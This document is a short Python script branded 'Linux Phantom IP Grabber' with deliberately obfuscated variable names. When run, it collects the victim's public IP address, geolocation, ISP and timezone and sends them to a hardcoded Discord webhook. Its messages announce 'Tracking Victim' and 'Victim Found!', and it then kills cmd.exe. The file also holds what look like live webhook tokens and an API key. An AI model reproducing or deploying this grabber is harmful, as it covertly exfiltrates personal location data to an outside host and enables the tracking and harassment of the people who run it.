# Obfuscated code for main.py

import requests, json, time, subprocess as d, os
from dhooks import Webhook, Embed
from datetime import datetime as c
import sys

def b():
    return requests.get('https://api.ipify.org/').text

def i():
    return requests.get(f'http://extreme-ip-lookup.com/json/{b()}?key=9OIrviWeSJxhxxR8oOCI').json() #Your API Key WILL GO HERE AFTER key=

def f(a):
    g = Embed(title="IP Information", description="Tracking down the target's digital footprint...", color=0xFF0000)
    g.set_thumbnail(url="https://i.imgur.com/1234567.png")
    for h, j in a.items():
        if h == "businessName":h = "**Business Name**"
        elif h == "businessWebsite":h = "**Business Website**"
        elif h == "city":h = "**City**"
        elif h == "continent":h = "**Continent**"
        elif h == "country":h = "**Country**"
        elif h == "countryCode":h = "**Country Code**"
        elif h == "ipName":h = "**Hostname**"
        elif h == "ipType":h = "**IP Type**"
        elif h == "isp":h = "**ISP**"
        elif h == "lat":h = "**Latitude**"
        elif h == "lon":h = "**Longitude**"
        elif h == "message":h = "**Status Message**"
        elif h == "org":h = "**Organization**"
        elif h == "query":h = "**IP Address**"
        elif h == "region":h = "**Region**"
        elif h == "status":h = "**Status**"
        elif h == "timezone":h = "**Timezone**"
        elif h == "utcOffset":h = "**UTC Offset**"
        g.add_field(name=h.capitalize(), value=j, inline=True)
    return g

def main():
    a = "```diff\n-█░░ █ █▄░█ █░█ ▀▄▀   +█▀█ █░█ ▄▀█ █▄░█ ▀█▀ █▀█ █▀▄▀█ \n-█▄▄ █ █░▀█ █▄█ █░█   +█▀▀ █▀█ █▀█ █░▀█ ░█░ █▄█ █░▀░█ \n+                        +Linux Phantom IP Grabber ©+\n```"
    h = "https://discord.com/api/webhooks/1136811328212828190/qUki18tSz3FCU7-wB6yYPusiGmPRlFuhSQsgF68eJ_foEbZnuwXhBI83Mb5hqufNIa9N"  # REPLACE WITH YOUR WEBHOOK
    j = Webhook(h)
    j.send(a)
    time.sleep(3)
    j.send("```diff\n+Tracking Victim\n```")
    time.sleep(3)
    k = b()
    l = i()
    m = f(l)
    j.send(embed=m)
    time.sleep(3)
    j.send("```diff\n+Victim Found! Dont Forget To Join 𝗗𝗶𝘀𝗰𝗼𝗿𝗱.𝗶𝗼/𝗛𝗮𝗰𝗸𝗠𝗲\n```")
    time.sleep(3)
    d.run("taskkill /f /im cmd.exe")

if __name__ == "__main__":
    main()
